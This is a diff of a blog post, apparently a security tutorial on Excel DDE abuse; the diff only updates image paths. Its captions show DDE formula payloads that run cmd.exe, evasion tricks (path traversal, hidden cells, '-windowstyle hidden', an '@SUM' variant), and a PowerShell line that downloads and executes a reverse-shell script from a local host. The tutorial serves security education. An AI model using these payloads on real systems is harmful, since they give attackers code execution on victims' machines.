@@ -45,7 +45,7 @@ As I mentioned above, DDE is a feature built into Microsoft Office, meaning it c
 
 Starting off in the most basic and benign way possible, I will show how to use a DDE payload in Excel to open a calculator.
 <figure style="text-align:center; margin:1em">
-<img src="/resources/content/images/2018/12/calc-cmd.gif" alt="DDE-Calc">
+<img src="/images/lol-dde/calc-cmd.gif" alt="DDE-Calc">
 <figcaption style="font-size:small">
  =CMD|'/c calc.exe'!'a1'
 </figcaption>
@@ -56,7 +56,7 @@ When Excel comes across a '=' it knows to evaluate the contents of the cell. Nor
 # Let's Make This Sneakier
 So that payload will let you run just about anything installed on the computer (actually…really anything), but a warning will pop up asking the user if they want to run CMD.EXE. That's not exactly the friendliest warning - even though people just say ok to pop-ups anyway. But we can do better.
 <figure style="text-align:center; margin:1em">
-<img src="/resources/content/images/2018/12/dde-calc-obfuscated.gif" alt="DDE-Calc">
+<img src="/images/lol-dde/dde-calc-obfuscated.gif" alt="DDE-Calc">
 <figcaption style="font-size:small">
 =MSEXCEL|'..\..\..\..\Windows\system32\cmd.exe /c calc.exe'!'a1'
 </figcaption>
@@ -69,7 +69,7 @@ In addition, feel free to hide the cell in the spreadsheet. When these payloads 
 So now we basically have a well-hidden payload that opens a calculator...yay. But if you remember, DDE can be used to run any command. In the spirit of continuing to live off the land, let's try PowerShell.
 
 <figure style="text-align:center; margin:1em">
-<img src="/resources/content/images/2018/12/dde-shell-obfuscated.gif">
+<img src="/images/lol-dde/dde-shell-obfuscated.gif">
 <figcaption style="font-size:small">
 =MSEXCEL|'..\..\..\..\Windows\system32\cmd.exe /c powershell.exe $e=(New-Object System.Net.WebClient).DownloadString(\"http://127.0.0.1/revshell.ps1\");powershell $e'!'a1'
 </figcaption>
@@ -79,7 +79,7 @@ So now we basically have a well-hidden payload that opens a calculator...yay. Bu
 Nice. A one-line PowerShell script to download what appears to be a reverse shell and execute it. This particular script will open a PowerShell window, but adding '-windowstyle hidden' should take care of that, and frankly the damage is already done.  Plus, we still haven't used anything that Microsoft didn’t give us for free (er…“free”). That isn't to say we couldn't. We can download anything and run it.
 
 <figure style="text-align:center; margin:1em">
-<img src="/resources/content/images/2018/12/dde-chrome-obfuscated.gif">
+<img src="/images/lol-dde/dde-chrome-obfuscated.gif">
 <figcaption style="font-size:small">
 =MSEXCEL|'..\..\..\..\Windows\system32\cmd.exe /c "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"'!'a1'
 </figcaption>
@@ -93,7 +93,7 @@ What?
 It wasn’t.
  
 <figure style="text-align:center; margin:1em">
-<img src="/resources/content/images/2018/12/dde-calc-with-at-sign.gif">
+<img src="/images/lol-dde/dde-calc-with-at-sign.gif">
 <figcaption style="font-size:small">
 @SUM(cmd|'/c calc.exe'!a1)
 </figcaption>
